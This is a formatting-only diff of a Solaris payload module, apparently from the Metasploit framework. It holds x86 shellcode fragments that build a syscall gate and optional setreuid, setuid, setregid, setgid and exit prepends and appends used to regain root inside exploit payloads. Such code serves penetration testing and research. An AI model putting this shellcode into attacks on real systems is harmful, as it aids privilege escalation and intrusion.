@@ -75,55 +75,55 @@ module Msf::Payload::Solaris
     if (test_arch.include?(ARCH_X86))
 
       # Syscall code
-      sc = "\x68\xff\xd8\xff\x3c" +#   pushl   $0x3cffd8ff                #
-           "\x6a\x65"             +#   pushl   $0x65                      #
-           "\x89\xe6"             +#   movl    %esp,%esi                  #
-           "\xf7\x56\x04"         +#   notl    0x04(%esi)                 #
-           "\xf6\x16"              #   notb    (%esi)                     #
+      sc = "\x68\xff\xd8\xff\x3c" + #   pushl   $0x3cffd8ff                #
+           "\x6a\x65"             + #   pushl   $0x65                      #
+           "\x89\xe6"             + #   movl    %esp,%esi                  #
+           "\xf7\x56\x04"         + #   notl    0x04(%esi)                 #
+           "\xf6\x16"               #   notb    (%esi)                     #
 
       # Prepend
 
       if (datastore['PrependSetreuid'])
         # setreuid(0, 0)
-        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-               "\x50"                 +#   pushl   %eax                       #
-               "\x50"                 +#   pushl   %eax                       #
-               "\xb0\xca"             +#   movb    $0xca,%al                  #
-               "\xff\xd6"              #   call    *%esi                      #
+        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
+               "\x50"                 + #   pushl   %eax                       #
+               "\x50"                 + #   pushl   %eax                       #
+               "\xb0\xca"             + #   movb    $0xca,%al                  #
+               "\xff\xd6"               #   call    *%esi                      #
       end
 
       if (datastore['PrependSetuid'])
         # setuid(0)
-        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-               "\x50"                 +#   pushl   %eax                       #
-               "\xb0\x17"             +#   movb    $0x17,%al                  #
-               "\xff\xd6"              #   call    *%esi                      #
+        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
+               "\x50"                 + #   pushl   %eax                       #
+               "\xb0\x17"             + #   movb    $0x17,%al                  #
+               "\xff\xd6"               #   call    *%esi                      #
       end
 
       if (datastore['PrependSetregid'])
         # setregid(0, 0)
-        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-               "\x50"                 +#   pushl   %eax                       #
-               "\x50"                 +#   pushl   %eax                       #
-               "\xb0\xcb"             +#   movb    $0xcb,%al                  #
-               "\xff\xd6"              #   call    *%esi                      #
+        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
+               "\x50"                 + #   pushl   %eax                       #
+               "\x50"                 + #   pushl   %eax                       #
+               "\xb0\xcb"             + #   movb    $0xcb,%al                  #
+               "\xff\xd6"               #   call    *%esi                      #
       end
 
       if (datastore['PrependSetgid'])
         # setgid(0)
-        pre << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-               "\x50"                 +#   pushl   %eax                       #
-               "\xb0\x2e"             +#   movb    $0x2e,%al                  #
-               "\xff\xd6"              #   call    *%esi                      #
+        pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
+               "\x50"                 + #   pushl   %eax                       #
+               "\xb0\x2e"             + #   movb    $0x2e,%al                  #
+               "\xff\xd6"               #   call    *%esi                      #
       end
       # Append
 
       if (datastore['AppendExit'])
         # exit(0)
-        app << "\x31\xc0"             +#   xorl    %eax,%eax                  #
-               "\x50"                 +#   pushl   %eax                       #
-               "\xb0\x01"             +#   movb    $0x01,%al                  #
-               "\xff\xd6"              #   call    *%esi                      #
+        app << "\x31\xc0"             + #   xorl    %eax,%eax                  #
+               "\x50"                 + #   pushl   %eax                       #
+               "\xb0\x01"             + #   movb    $0x01,%al                  #
+               "\xff\xd6"               #   call    *%esi                      #
       end
 
       # Prepend syscall code to prepend block
